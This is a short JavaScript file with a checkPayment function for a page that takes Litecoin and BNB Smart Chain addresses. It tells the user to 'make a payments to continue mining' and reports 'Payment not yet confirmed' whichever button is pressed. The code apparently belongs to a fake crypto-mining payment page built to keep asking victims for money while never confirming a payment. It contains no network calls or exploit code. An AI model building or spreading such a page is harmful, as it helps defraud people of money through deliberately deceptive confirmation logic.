// script.js

function checkPayment() {
  var ltcAddress = document.getElementById('ltcAddress').value;
  var bnbAddress = document.getElementById('bnbAddress').value;

  // Dummy logic to simulate payment confirmation
  var paymentConfirmed = confirm("Payment not yet confirmed for Litecoin Address: " + ltcAddress + "\nand BNB Smart Chain Address: " + bnbAddress + "\n\nKindly make a payments to continue mining ⛏️?");

  if (paymentConfirmed) {
    document.getElementById('paymentStatus').innerHTML = "Payment not yet confirmed. Please try again later Thank you!";
  } else {
    document.getElementById('paymentStatus').innerHTML = "Payment not yet confirmed. Please try again later.";
  }
}
